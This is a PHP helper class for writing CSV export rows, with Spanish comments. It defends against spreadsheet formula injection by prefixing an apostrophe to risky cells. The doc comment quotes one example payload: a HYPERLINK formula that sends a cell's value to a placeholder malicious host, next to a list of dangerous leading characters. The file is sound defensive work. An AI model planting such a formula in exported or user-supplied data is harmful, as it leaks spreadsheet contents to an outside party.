<?php

namespace App\Support;

/**
 * Escritura de filas CSV para las exportaciones (se abren en Excel).
 *
 * Seguridad (inyección de fórmulas / CSV injection, CWE-1236): un texto
 * capturado por un usuario que empiece con = + - @ tabulador o retorno
 * (p. ej. «=HYPERLINK("http://sitio-malo/?"&A1,"Ver")») se ejecutaría como
 * fórmula al abrir el archivo en Excel o LibreOffice. A esas celdas se les
 * antepone un apóstrofo para que se muestren como texto. Los números simples
 * (-12, +5.5) se dejan igual.
 */
final class Csv
{
    private const PELIGROSOS = ['=', '+', '-', '@', "\t", "\r", "\n"];

    /**
     * @param  resource  $salida
     * @param  array<int, mixed>  $celdas
     */
    public static function fila($salida, array $celdas): void
    {
        fputcsv($salida, array_map(self::celda(...), $celdas), escape: '');
    }

    public static function celda(mixed $valor): mixed
    {
        if (! is_string($valor) || $valor === '') {
            return $valor;
        }
        if (in_array($valor[0], self::PELIGROSOS, true) && ! preg_match('/^[+-]?\d+(\.\d+)?$/', $valor)) {
            return "'".$valor;
        }

        return $valor;
    }
}
